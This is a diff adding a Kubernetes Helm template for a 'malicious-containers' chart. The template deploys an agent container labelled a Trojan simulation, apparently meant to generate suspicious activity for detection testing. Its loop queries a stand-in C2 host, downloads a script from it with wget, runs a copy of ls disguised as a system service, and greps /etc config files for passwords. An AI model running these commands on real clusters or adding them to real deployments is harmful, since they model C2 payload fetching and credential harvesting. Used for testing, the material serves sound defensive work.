@@ -1,0 +1,55 @@
+{{- if .Values.agent.enabled -}}
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "malicious-containers.fullname" . }}-agent
+  labels:
+    {{- include "malicious-containers.labels" . | nindent 4 }}
+    app.kubernetes.io/component: agent
+    kids-label: "1"
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
+      app.kubernetes.io/component: agent
+  template:
+    metadata:
+      labels:
+        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
+        app.kubernetes.io/component: agent
+        kids-label: "1"
+    spec:
+      {{- with .Values.nodeSelector }}
+      nodeSelector:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      containers:
+        - name: agent
+          image: {{ .Values.agent.image }}
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Starting Trojan Agent simulation..."
+              while true; do
+                echo "[$(date)] Communicating with control server (simulated)..."
+                # Simulate DNS lookups to C2
+                nslookup malicious-c2.internal || true
+                
+                echo "[$(date)] Downloading deceptive file 'update_pkg.sh'..."
+                # Simulate file download
+                wget -O /tmp/update_pkg.sh http://malicious-c2.internal/update.sh 2>/dev/null || echo "Download failed (simulated)"
+                
+                echo "[$(date)] Executing disguised program..."
+                # Create a fake binary that looks like a system utility
+                cp /bin/ls /tmp/systemd-service
+                chmod +x /tmp/systemd-service
+                /tmp/systemd-service -la /root 2>/dev/null || true
+                
+                echo "[$(date)] Unauthorized resource use (scanning)..."
+                # Simulate scanning for sensitive files
+                find /etc -name "*.conf" 2>/dev/null | xargs grep "password" 2>/dev/null || true
+                
+                sleep 60
+              done
+{{- end }}
